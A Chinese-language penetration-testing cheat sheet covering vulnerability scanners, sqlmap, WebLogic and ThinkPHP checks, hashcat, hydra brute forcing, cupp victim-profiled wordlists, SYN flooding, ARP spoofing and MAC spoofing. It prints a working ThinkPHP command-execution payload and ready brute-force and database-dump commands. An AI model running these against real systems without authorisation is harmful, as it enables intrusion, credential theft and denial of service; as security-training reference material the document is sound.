# 一些平台公开的漏洞攻击脚本披露
- https://www.exploit-db.com/
- https://www.seebug.org/


# SpringBoot的一些漏洞披露
https://github.com/LandGrey/SpringBootVulExploit
https://github.com/rabbitmask/SB-Actuator



# 漏洞扫描
漏洞扫描是指基于漏洞数据库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，发现可利用漏洞的一种安全检测(渗透攻击)行为。

## 常见的漏洞扫描工具
- 针对某类漏洞的:sql注入(sqlmap)、weblogic(weblogicscan)
- 针对某类CMS的:wordpress(wpscan)、dedecms(dedecmsscan)
- 针对系统应用层:nessus
- 针对某类框架的:Struts2(Struts2漏洞检查工具)、springboot（SB-Actuator)
- 针对web服务的:burpsuite、xray、awvs

### 反弹shell(reverse shell)，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。(前提需要有公网IP)

### AWVS（Acunetix Web Vulnerability Scanner）网络漏洞扫描工具
awvs通过网络爬虫测试你的网站安全，检测流行安全漏洞。从11.0版本开始，AWVS就变成了使用浏览器端打开的形式，使用安装时自定义的端口来访问
- WebScanner:核心功能，web安全漏洞扫描(深度，宽度，限制20个)
- Site Crawler:爬虫功能，遍历站点目录结构
- Target Finder:端口扫描，找出web服务器(80、443)
- Subdomian Scanner 子域名扫描器，利用DNS查询
- Blind SQL Injector:盲注工具
- Http Editor http:协议数据包编辑器
- HTTP Sniffer :HTTP协议嗅探器(fiddler，wireshark,bp)
- HTTP Fuzzer:模糊测试工具(bp)
- Authentication Tester:Web认证破解工具
~~~shell
# awvs安装，建议不要在你的电脑上直接安装，因为中间会安装证书到你的操作系统，建议通过docker或者虚拟机安装
sudo docker run -d -p 3443:3443 --restart=unless-stopped --name=acunetix_web quay.io/hiepnv/acunetix
# 访问：https://127.0.0.1:3443/#/login 
# 账号密码：admin@acu.com   Passw0rd!
# 网页可以设置语言汉化
# 功能可能没有上述说明的那么强，需要更换镜像获得更多的功能
~~~

### BurpSuite：web 应用程序的渗透测试集成工具
BurpSuite是用于攻击web 应用程序的集成工具
- Dashboard 模块是仪表盘模块：可以创建爬虫扫描和漏洞审计扫描任务或者是直接开始设置目标进行扫描
- Target 模块是目标模块：可以设置扫描目标列表，在其他地方直接使用这些列表，也可以查看扫描的站点地图目录结构
- Proxy是一个拦截HTTP/S和WebSocket的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截、放行、查看、修改在两个方向上的原始数据流
- Intruder是一个定制的高度可配置的工具，对web应用程序进行自动化攻击（在报文中设置多个payload位置占位，然后针对每个payload位置都设置一组payload集合列表（其实就是字典），然后可以交叉遍历字典发起请求），如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞
- Repeater是一个靠手动操作来补发单独的HTTP 请求（可以获取历史请求或者拦截请求，然后进行请求重放攻击），并分析应用程序响应的工具。
- Sequencer是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。
- Decoder是一个进行手动执行或对应用程序数据者智能解码编码的工具。
- Comparer是一个实用的工具，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。
- Extender模块：扩展模块
- project options模块：项目设置模块
- user options模块：用户设置模块
- Spider是一个应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。
- Scanner——是一个仅限专业版的高级工具，执行后，它能自动地发现web 应用程序的安全漏洞。

~~~shell
# 如果要汉化就提前看汉化最高支持的版本然后下载对应的Burp Suite版本
# 安装参考：https://blog.csdn.net/m0_52985087/article/details/140299827
# Burp Suite下载：https://portswigger.net/burp/releases
# 汉化包下载：https://github.com/Leon406/BurpSuiteCN-Release/releases

# 默认情况下BurpSuite会在8080端口启动代理服务，导出BurpSuite的CA证书给其他工具使用，例如将这个代理CA证书导入浏览器并且设置浏览器的代理为BurpSuite的8080端口代理服务进行使用
# CA证书导出导入浏览器参考https://zhuanlan.zhihu.com/p/662090810
# 方式一：http://127.0.0.1:8080/cert 或者 http://burp/cert（这个估计要先在系统代理中设置BurpSuite的8080端口代理服务） 可以下载CA证书
# 方式二：通过BurpSuite的proxy设置可以导出CA证书
~~~

### 使用sqlmap进行sql注入
sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞获取数据库服务器的权限。具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令
~~~shell
# 安装sqlmap
# 官方网站：http://sqlmap.org/
# Github：https://github.com/sqlmapproject/sqlmap
# kali中自带sqlmap，路径 /usr/share/sqlmap
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# 在kali中可以直接使用sqlmap命令，无须加python和文件后缀名
python sqlmap.py [options]
# --batch 参数：（默认确认）不再询问是否确认。
# -u 参数：指定需要检测的url进行检测注入点，单/双引号包裹。中间如果有提示，就输入y（可以使用--batch 参数全部确认），扫描完成后，告诉存在的注入类型（布尔盲注、报错注入、时间盲注、联合注入）和使用的数据库及版本，例子：sqlmap -u 'http://xx/?id=1'
# -m 参数：指定文件，可以批量扫描文件中的url，例子：sqlmap -m urls.txt --batch 
# -D 参数：指定目标数据库，单/双引号包裹，可以指定多个数据库使用逗号分隔，常配合其他参数使用
# -T 参数：指定目标表，单/双引号包裹，常配合其他参数使用
# -C 参数：指定目标字段，单/双引号包裹，常配合其他参数使用
# --dbs 参数： 查看所有数据库，例子：sqlmap -u 'http://xx/?id=1' --dbs
# --current-db 参数： 查看当前使用的数据库，例子：sqlmap -u 'http://xx/?id=1' --current-db
# --tables 参数：查看数据库下的数据表，不指定数据库默认获取数据库中所有的表。例子：sqlmap -u 'http://xx/?id=1' -D 'security,sys' --tables
# --columns 参数：查看数据库下的数据表中的字段，不指定表名默认获取当前数据库中所有表的字段。例子：sqlmap -u 'http://xx/?id=1' -D 'security' -T 'users' --columns
# --schema 参数：查看数据库下的数据表中的字段类型，不指定表名默认获取当前数据库中所有表的字段类型。例子：sqlmap -u 'http://xx/?id=1' -D 'security' -T 'users' --schema
# --dump 参数：查看数据库下的数据表中的数据，默认获取表中的所有数据，可以使用 --start --stop 指定开始和结束的行，只获取一部分数据。例子：sqlmap -u 'http://xx/?id=1' -D 'security' -T 'users' --start 1 --stop 5 --dump
# --users 参数：获取数据库的所有用户名，例子：sqlmap -u 'http://xx/?id=1' --users
# --current-user 参数：获取当前登录数据库的用户，例子：sqlmap -u 'http://xx/?id=1' --current-user
# --passwords 参数：获取所有数据库用户的密码（哈希值）。数据库不存储明文密码，只会将密码加密后，存储密码的哈希值，所以这里只能查出来哈希值；当然可以借助工具把它们解析成明文。例子：sqlmap -u 'http://xx/?id=1' --passwords
# --privileges 参数：查看每个数据库用户都有哪些权限。例子：sqlmap -u 'http://xx/?id=1' --privileges
# --is-dba 参数：判断当前登录的用户是不是数据库的管理员账号，如果管理员，输出会显示 current user is DBA:True。例子：sqlmap -u 'http://xx/?id=1' --is-dba
# --hostname 参数：获取服务器主机名。例子：sqlmap -u 'http://xx/?id=1' --hostname
# --search 参数：搜索数据库中是否存在指定库/表/字段，需要指定库名/表名/字段名。例子：sqlmap -u 'http://xx/?id=1' -D 'security' --search 搜索数据库中有没有 security 这个数据库
# --statements 参数：获取数据库中正在执行的SQL语句，例子：sqlmap -u 'http://xx/?id=1' --statements
# --tamper 参数：SQLmap内置了很多绕过脚本，在 /usr/share/sqlmap/tamper/ 目录下，可以指定绕过脚本，绕过WAF或ids等。例如：sqlmap -u 'http://xx/?id=1' --tamper 'space2comment.py'
# --cookie 参数：指定cookie的值，单/双引号包裹，例子：sqlmap -u "http://xx?id=x" --cookie 'cookie'
# -a 参数：获取所有能获取的内容，会消耗很长时间，例子：sqlmap -u 'http://xx/?id=1' -a

# --method=GET 参数： 指定请求方式（GET/POST）
# -r 参数：检测post请求的注入点，使用BP等工具抓包，将http请求内容保存到txt文件中，指定抓包的文件，SQLmap会通过post请求方式检测目标，例子：sqlmap -r bp.txt
# --random-agent 参数： 随机切换UA（User-Agent）
# --user-agent ' ' 参数： 使用自定义的UA（User-Agent）
# --referer ' ' 参数：使用自定义的 referer
# --proxy="127.0.0.1:8080" 参数：指定代理
# --threads 10 参数：设置线程数，最高10
# --level=1 参数：执行测试的等级（1-5，默认为1，常用3）
# --risk=1 参数：风险级别（0~3，默认1，常用1），级别提高会增加数据被篡改的风险
~~~

### WebLogic 服务漏洞查找
WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和JavaEnterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中，默认端口7001，访问会Error 404--Not Found
~~~shell
# 源码：https://github.com/rabbitmask/WeblogicScan
git clone https://github.com/rabbitmask/WeblogicScan.git

# 安装依赖
cd WeblogicScan
python -m pip install -r requirements.txt

# 命令查看帮助
python WeblogicScan.py -h

# 扫描单个目标的漏洞
python WeblogicScan.py -u 127.0.0.1 -p 7001

# 批量扫描目标列表的漏洞
python WeblogicScan.py -f target.txt
~~~

### ThinkPHP 服务漏洞查找
ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，诞生于2006年初原名FCS，2007年元旦正式更名为ThinkPHP，遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib(标签库)RoR的ORM映射和ActiveRecord模式。
ThinkPHP可以支持windows/Unix/Linux等服务器环境，正式版需要PHP5.0以上版本支持，支持MySg、PgSQL、Sqlite多种数据库以及PDO扩展，ThinkPHP框架本身没有什么特别模块要求，具体的应用系统运行环境要求视开发所涉及的模块。默认端口8089
很多cms就是基于thinkphp5二次开发的，所以thinkphp出问题的话，会影响很多基于thinkphp开发的网站
~~~shell
# 源码：https://github.com/admintony/thinkPHPBatchPoc
git clone https://github.com/admintony/thinkPHPBatchPoc.git

# 安装依赖
python .\thinkPHPBatchPoc.py [-u admintony.com]
# -u 参数：指定ThinkPHP 服务检测是否存在thinkPHP代码执行漏洞
# -f 参数：检测文件中的批量ThinkPHP 服务是否存在thinkPHP代码执行漏洞，案例：thinkPHPBatchPoc.py -u target_URL

# 如下检查出来的漏洞
PS E:\PyProject> python .\thinkPHPBatchPoc.py -u admintony.com
[+] http://admintony.com is vulnerable
[+] Payload is ?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20www_admintony_com
# 直接浏览器访问：https://admintony.com?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20www_admintony_com
# 会在远程ThinkPHP服务器执行URL末尾传递的 echo www_admintony_com 命令
~~~

### Struts2 服务漏洞查找
Apache Struts是美国阿帕奇(Apache)软件基金会负责维护的一个开源项目，是一套用于创建企业级Java Web 应用的开源MVC框架，主要提供两个版本框架产品:Struts 1和Struts 2truts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。默认端口8080
~~~shell
# 源码：https://github.com/HatBoy/Struts2-Scan
~~~

### Jboss 服务漏洞查找
-个基于J2EE的开放源代码的应用服务器。JBoss是一个管理EJB的容器和服务器但JBoss核心服务不包括支持servetJSP的WEB容器，一般与Tomcat或Jetty绑定使用。Jboss是Java EE应用服务器(就像Apache是web服务器一样)，专门用来运行Java EE程序的，默认端口8080
~~~shell
# 源码：https://github.com/GGyao/jbossScan
git clone https://github.com/GGyao/jbossScan.git
# 准备目标文件：将目标地址放入 target.txt 文件中，每行一个目标地址
python3 jbossScan.py
~~~

### Fastjson 漏洞查找
fastjson的作用是用于对JSON格式的数据进行解析和打包,所以出现json格式的地方就有可能使用了fastjson
~~~shell
# BurpSuite插件 FastjsonScan：https://developer.aliyun.com/article/1167264
~~~

### Shiro 框架漏洞查找
Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。
~~~shell
# BurpSuite插件 ShiroScan：https://github.com/Daybr4ak/ShiroScan
~~~

### 暴力hash碰撞解密
~~~shell
# 查看哈希值是通过什么算法加密的，一般哈希值是这样的 $id$salt$encrypted
man crypt
# 一般id号代表加密方式，常见的如下
#   1   | MD5
#   2a  | Blowfish (not in mainline glibc; added in some Linux distributions)
#   5   | SHA-256 (since glibc 2.7)
#   6   | SHA-512 (since glibc 2.7)

# 搜索查看加密方式类型的编号：Hash types 列表下对应加密算法的编号
man hashcat 

# 暴露字典破解，只要猜测字典数量够多就能破解
hashcat -m [加密算法编号] --force [存放hash值的文件] [字典文件，每行都是可能的密码]
# --show 参数：只查看破解的密码信息
# kali系统中提供的字典 /usr/share/wordlists/rockyou.txt.gz 该字典很大并且猜测的常见密码都在其中，可以使用这个字典进行暴力破解
# 例如  hashcat -m 1800 --force test.hash test.txt 其中的1800就是SHA-512 加密，即哈希值中开头$后面的id是6
~~~

### 暴力破解
~~~shell
# ssh暴力破解 hydra -l root -P passwords.txt -e nsr -o root-passwd-ok.txt -vV 192.168.0.200 ssh 
hydra [参数] [IP] [服务或者协议，例如ssh]
# -l 参数指定用户名，即单个可能的用户名
# -L 参数指定用户的用户名字典，即一组可能的用户名
# -p 参数指定密码，即单个可能的密码
# -P 参数指定密码字典，即一组可能的密码
# -e 参数指定额外的选项，例如 -e nsr 中的 n：空密码试探，s：使用账户名相同的密码进行试探，r：用户名称逆向后的名称也参与破解
# -M 参数指定目标ip列表文件，进行批量破解
# -s 参数指定目标服务的端口，如果不指定是按照服务或者协议的默认端口进行破解
# -o 参数破解成功的用户名和密码输出到指定文件
# -f 参数找到第一对登录名或者密码的时候中止破解
# -t 参数设置运行破解程序的线程数，默认是16
# -w 参数设置最大超时时间，单位
# -vV 参数显示详细过程，小写v越多信息越详细
# -R 恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）
# -x 自定义密码，例如-x 6:10:1a. 表示枚举的密码由数字、小写字母和单字符’.'等等组成，长度为 6 - 10 位。

# 常见服务和协议的破解方式

#破解ftp
hydra -L 用户名字典 -P 密码字典 -t 6 -e ns IP地址 -v

# http get方式提交，破解web登录：
hydra -L 用户名字典 -P 密码字典 -t 线程 -v -e nsr IP地址 http-get /admin/
hydra -L 用户名字典 -P 密码字典 -t 线程 -v -e nsr -f IP地址 http-get /admin/index.php
 
# http post方式在url后面添加用户密码提交，破解web登录：
hydra -f -l 用户名 -P 密码字典 -V -s 端口号 IP地址 http-post-form "/admin/index.php?action=login:user=USER&pw=PASS:"

# https 破解web登录
hydra -m /index.php -l 用户名 -P 密码字典.txt IP地址 https

# http-get 路由器破解
hydra -l admin -x 6:10:1a.~!@#$%^&()-= 192.168.1.1 http-get /
# -x 6:10:1a. 表示枚举的密码由 数字、小写字母和单字符’.'等等组成，长度为 6 - 10 位。

# http-proxy 破解
hydra -l admin -P 字典.txt http-proxy://IP地址

# smb 破解
hydra -l 用户名 -P 密码字典 IP地址 smb

# rdp破解，即windows远程登录破解
hydra -l administrator -P 密码字典.txt -V ip地址 rdp

# pop3破解，即邮箱破解
hydra -l 用户名 -P 密码字典.txt my.pop3.mail pop3

# telnet破解
hydra -l 用户字典.txt -P 密码字典.txt -s 23 -e ns -f -V ip地址 telnet 

# 语音通讯工具teamspeak破解
hydra -l 用户名字典 -P 密码字典.txt -s 端口号 -vV ip teamspeak


# 暴力破解能成功最重要的条件还是要有一个强大的密码字典！Kali默认自带的字典在 /usr/share/wordlists 目录下
# dirb 目录下
#   big.txt #大的字典
#   small.txt #小的字典
#   catala.txt #项目配置字典
#   common.txt #公共字典
#   euskera.txt #数据目录字典
#   extensions_common.txt #常用文件扩展名字典
#   indexes.txt #首页字典
#   mutations_common.txt #备份扩展名
#   spanish.txt #方法名或库目录
#   others #扩展目录，默认用户名等
#   stress #压力测试
#   vulns #漏洞测试
# dirbuster目录下
#   apache-user-enum-** #apache用户枚举
#   directories.jbrofuzz #目录枚举
#   directory-list-1.0.txt #目录列表大，中，小 big，medium，small
# fern-wifi目录
#   common.txt #公共wifi账户密码
# metasploit目录下有各种类型的字典

# cupp是一款基于python编写的可交互性的密码字典生成工具。结合社会工程学，你会获得一份根据个人信息生成的专属字典。与传统字典相比，其优势在于准确率更高。
# cupp 安装 apt-get install  cupp
sudo cupp [参数]
# -i：进入交互式命令行通过填写信息创建用户密码字典
#       填写受害人姓、名、绰号、生日
#       填写受害人配偶的名字、绰号、生日
#       填写孩子的名字、绰号、生日
#       填写宠物的名字以及公司的名字
#       是否添加一些关于受害人的关键词
#       是否在密码结尾添加一些特殊字符
#       是否在密码结尾添加一些随机数字
#       最终生成字典
# -w：在已存在的字典进行扩展
# -l：选择从github仓库下载不同国家的字典，最后的序号是退出交互式命令，cupp -l 填写你想要下载字典的序号
# -q：安静模式

# 收集目标web网站现有的或隐藏的url页面
sudo dirb [目标网站] [路径字典]
# 例如 sudo dirb https://www.cloudgrow.cn/ /usr/share/wordlists/dirb/common.txt
# -a <agent_string>：指定您的定制USER_AGENT。
# -c <cookie_string>：为HTTP请求设置cookie。
# -f：精细调整NOT_FOUND（404）检测。
# -H <header_string>：将自定义标头添加到HTTP请求。
# -i：使用不区分大小写的搜索。
# -l：找到时打印“ Location”标题。
# -N <nf_code>：忽略此HTTP代码的响应。
# -o <输出文件>：将输出保存到磁盘。
# -p <代理[：端口]>：使用此代理。（默认端口为1080）
# -P <proxy_username：proxy_password>：代理身份验证。
# -r：不要递归搜索。
# -R：交互式递归。（询问每个目录）
# -S：静默模式。不要显示经过测试的单词。（用于哑终端）
# -t：不要在网址上强制使用结尾的“ /”。
# -u <用户名：密码>：HTTP身份验证。
# -v：也显示NOT_FOUND页。
# -w：不要在警告消息上停止。
# -X <扩展名> / -x <扩展名文件>：在每个单词后加上该扩展名。
# -z：添加毫秒延迟，以免导致过多的Flood。


# netwox 网络工具集，可以创造任意的 TCP、UDP 和 IP 数据报文，以实现网络欺骗，并且可以在 Linux 和 Windows 系统中运行
# netwox安装 sudo apt install netwox
sudo netwox
# netwox 包含了超过 200 个不同的功能，通过特定的编号，使用不同的编号模块来实现不同的功能
# 编号的功能参考：https://devdiv.github.io/school/tools/net/netwox/#%E4%B8%8B%E8%BD%BD
# 基于tcp的 Floot攻击（DOS攻击的一种） sudo netwox 76 -i 127.0.0.1 -p 22
# 通过 sudo netstat -apn | SYN 可以看到有很多TCP连接
~~~

# arp中间人攻击
~~~shell
# 查看arp缓冲表
arp -a

# 删除arp缓冲表
arp -d

# 持续性的发送数据包给目标地址，欺骗受害人 "目标ip地址"(其实是别人上网流量会经过的地址) 要映射到我的网卡mac地址，一般目标ip地址是网关地址，即上网传输的包都会被我监控
sudo arpspoof -i [我的网卡名称] -t [受害人ip地址] [目标ip地址]
# 注意 arpspoof 只限于局域网并且无法跨网段欺骗
# 例如 sudo arpspoof -i eth0 -t 192.168.0.200 192.168.0.1
~~~

# mac地址欺骗
~~~shell
# 使用macchanger进行修改MAC地址进行欺骗，当然重启之后会恢复为真实的硬件MAC地址
macchanger [参数] [网卡名称]
# -s：显示网卡的 MAC 地址并退出，Current MAC是当前的MAC地址，Permanent MAC是真实的硬件MAC地址
# -e：不更改厂商字节（MAC地址的前3个字节是厂商字节），而修改后3个字节
# -a：设置相同类型的随机厂商 MAC 地址
# -A：设置任意类型的随机厂商 MAC 地址
# -p：注意不要用这个，它会重置永久硬件 MAC 地址
# -r：设置完全随机的 MAC 地址
# -l：打印已知厂商，获取苹果的MAC厂商地址 macchanger -l | grep Apple，获取华为的MAC厂商地址 macchanger -l | grep Huawei
# -b：假装是烧录地址
# -m：设置指定的MAC地址，例如 -m XX:XX:XX:XX:XX:XX 或者 --mac=XX:XX:XX:XX:XX:XX


# 先关闭要修改MAC地址的网卡
ifconfig [网卡名称] down

# 修改网卡的MAC地址，注意前3个字节需要是正规存在的 MAC 厂商字节，否则设置失败
macchanger -m XX:XX:XX:XX:XX:XX [网卡名称]

# 开启网卡
ifconfig [网卡名称] up

# 查看网卡mac地址是否修改
ifconfig
~~~
